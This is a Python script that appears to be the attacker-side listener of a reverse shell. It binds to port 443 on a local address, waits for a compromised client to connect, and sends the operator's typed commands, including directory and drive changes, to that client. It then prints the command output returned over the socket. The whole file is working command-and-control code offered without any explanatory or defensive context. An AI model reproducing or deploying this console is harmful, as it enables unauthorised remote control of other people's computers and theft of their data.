#SErver
import socket

end_result = "<Last_string>"
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
Server = ("192.168.1.11",443)
s.bind(Server)
s.listen(10)
print("Listening for incoming connections...")
req, res = s.accept()
print("Incoming connection from:", res[0],":", res[1])
while True:
    try:
        Command = input("> ")
        command_enc = Command.encode()
        if Command == "exit":
            req.send(command_enc)
            break
        elif Command == "":
            continue
        elif Command.startswith("cd"):
            req.send(command_enc)
            continue
        elif len(Command)==2 and Command[0].isalpha() and Command[1] == ":":
            req.send(command_enc)
            continue
        else:
            req.send(command_enc)
            full_result = b''
            while True:
                part_of_result = req.recv(1024)
                if part_of_result.endswith(end_result.encode()):
                    chunk = part_of_result[:-len(end_result)]
                    full_result += chunk
                    print(full_result.decode())
                    break
                else:
                    full_result += part_of_result
    except Exception:
        print("Client disconnected")
s.close()
